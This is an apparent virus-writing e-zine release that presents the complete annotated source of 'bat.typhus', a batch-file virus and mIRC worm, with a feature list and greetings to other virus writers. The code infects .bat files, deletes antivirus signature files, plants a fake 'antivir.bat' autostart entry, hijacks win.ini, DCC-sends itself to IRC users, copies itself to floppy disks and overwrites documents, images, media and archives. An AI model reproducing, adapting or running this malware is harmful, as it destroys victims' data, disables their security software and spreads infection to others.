Bat.Typhus by philet0ast3r 

"Pinoy Virus Writers" proudly presents:

"bat.typhus" by philet0ast3r [rRlf]
************************************

                  000000
                 00000000  00     000000000
                 00    00  00    00000000000
                 00    00  00    00       00
                 00   000  00    00       00
       000000000000000000  00    00       00
    0000000000000000000    00    00      00
  00000          00        000000000000000
 0000          00000000    00000000000000
  0000       00000000000         00
    000      000 00   0000       00
     000   000   00     0000     00
      000 000    00       0000   00
       0000      00         0000 00
        00       00           00000
                 00              00
                 00

             www.rRlf.de

This is my eighth virus (my sixt batch-virus), and we have got
January 2001 now. This one should be released in SallyOne Group
E-Zine#1, but BTK (former owner of SallyOne.com) decided to leave
the scene and let the group die. Well, here we are.
This virus is very similar to bat.kia. But it has a more destructive
payload. Nevertheless, here are some facts about it:
-bat-infector
-parasitic
-mIRC worm
-spreads via disks
-autostart-secured win.ini-residency
-retro: F-Prot 95, McAfee, Thunderbyte, Norton AntiVirus 2000
 (it does not recognize the virus, even if heuristic is at
 maximum)
-payload: overwrites all files in the current directory with the
 following extensions with the virus: .txt, .doc, .dot, .rtf, .pdf,
 .xls, .hlp, .htm, .html, .inf, .bmp, .jpg, .gif, .pcx, .cpt, .avi,
 .mpg, .mov, .swf, .scr, .ppt, .wav, .mp3, .zip, .rar, .arj, .lzh
-copies itself as call-back to the root-directory
-uses ".."-method to change directories
-fully compatible to Windows ME, Windows 98, Windows 95
 (has been tested)
-size: 2.532 bytes

philet0ast3r likes to gr33t: 3ri5, dr.g0nZo [rRlf], El DudErin0 [rRlf],
Energy [rRlf], rastafarie [rRlf], luN4 [rRlf], Zoom23 [PVW], Kleptic [DoJ],
h0axly, ToxiC, Virus 3000, Necronomikon, SnakeByte, Senna Spy, vortex, Zarrmann,
pissn3lk [AFN], El Commandante, Julia, b3rnti, Ernst, fir3nz3 z00l, Mindjuice.

Well, here is the script (with some comments "-->"; have to be
removed for virus to run) ... phile-name should be bat.typhus.bat,
but it's not neccessary:

::Where's your sense of life? (tph)
::Right.
::It's not there like the file you wanted. (tph)
::Perhaps you got to change something ... (tph)

-->the above is some kind of message-payload
-->if a file gets overwritten by the payload, and the file can display text,
-->the user can read this message

@echo off%_tph%
if '%1=='tph goto tph%2
set tph=%0.bat
if not exist %tph% set tph=%0
if '%tph%==' set tph=autoexec.bat
if exist c:\_tph.bat goto tphg
if not exist %tph% goto etph
find "tph"<%tph%>c:\_tph.bat
attrib c:\_tph.bat +h
:tphg
command /e:5000 /c c:\_tph tph vir

-->the above is a quite normal infection-routine
-->the hidden call-back-file is also created here

:etph
ctty nul.tph
if exist c:\_tph.bat del c:\programme\norton~1\s32integ.dll
if exist c:\_tph.bat del c:\programme\f-prot95\fpwm32.dll
if exist c:\_tph.bat del c:\programme\mcafee\scan.dat
if exist c:\_tph.bat del c:\tbavw95\tbscan.sig

-->the above is the retro-routine
-->the AVs can not scan without those files

if exist c:\windows\startmen�\programme\autostart\antivir.bat goto rdtph
copy bat.typhus.bat c:\windows\tph.sys
echo @echo off>tphhh.bat
echo ctty nul>>tphhh.bat
echo if exist c:\windows\system\bat.typhus.bat goto 0k>>tphhh.bat
echo copy c:\windows\tph.sys c:\windows\system\bat.typhus.bat>>tphhh.bat
echo :0k>>tphhh.bat
move tphhh.bat c:\windows\startmen�\programme\autostart\antivir.bat

-->the above is the autostart-secure-routine for the residency
-->it checks if the win.ini-residency is still working

-->the below is the residency-routine
-->it infects the win.ini
-->the empty lines are neccessary for windows taking this as true win.ini

:rdtph
if exist c:\windows\system\bat.typhus.bat goto wytph
copy bat.typhus.bat c:\windows\system
copy bat.typhus.bat + c:\windows\win.ini c:\windows\system\win.ini
del c:\windows\win.ini
move c:\windows\system\win.ini c:\windows
goto wytph

[windows]
load=c:\windows\system\bat.typhus.bat
run=C:\WINDOWS\SYSTEM\cmmpu.exe
NullPort=None

:wytph
echo [script]>tph23.bat
echo n0=on 1:JOIN:#:{ >>tph23.bat
echo n1= /if ( nick == $me ) { halt } >>tph23.bat
echo n2= /.dcc send $nick c:\windows\system\bat.typhus.bat >>tph23.bat
echo n3=} >>tph23.bat
if exist c:\mirc\mirc.ini copy tph23.bat c:\mirc\script.ini
if exist c:\mirc32\mirc.ini copy tph23.bat c:\mirc32\script.ini
if exist c:\progra~1\mirc\mirc.ini copy tph23.bat c:\progra~1\mirc\script.ini
if exist c:\progra~1\mirc32\mirc.ini copy tph23.bat c:\progra~1\mirc32\script.ini

-->the above is the worm-routine
-->it makes a mIRC-script-file and places it in a possible mIRC-directory

:ditph
if exist tph23.bat command /f /c copy c:\windows\system\bat.typhus.bat a:\

-->the above is a command line, that makes it possible to copy to diskettes
-->there will be no error if there is no disk in drive a:
-->or if it is writeprotected or full

:pltph
if exist tph23.bat for %%i in (*.txt,*.doc,*.dot,*.rtf,*.pdf,*.xls,*.hlp,*.htm,*.html,*.inf,*.bmp,*.jpg,*.gif,*.pcx,*.cpt,*.avi,*.mpg,*.mov,*.swf,*.scr,*.ppt,*.wav,*.mp3,*.zip,*.rar,*.arj,*.lzh) do copy %0 %%i>nul
del tph23.bat

-->the above is the payload
-->it searches for all files with the given extensions in the current directory
-->all found files are overwritten with the virus
-->(that means there is no rest of the file, even if the file is bigger than the virus;
-->so the file is completly destroyed)

:natph
set tph=
goto tphend
:tphvir
for %%a in (*.bat ..\*.bat c:*.bat) do call c:\_tph tph i %%a
exit tph
:tphi
find "tph"<%3>nul
if not errorlevel 1 goto tphj
type c:\_tph.bat>tph$
type %3>>tph$
move tph$ %3>nul
exit tph
:tphj
set tph!=%tph!%1
if %tph!%==1 exit
:tphend

-->the above is the rest of the infection-routine<br> This file is decompiled by an unregistered version of ChmDecompiler.<br> Regsitered version does not show this message. <br>You can download ChmDecompiler at :   <a href="http://www.etextwizard.com/" target=_blank>http://www.etextwizard.com/</a><br><br>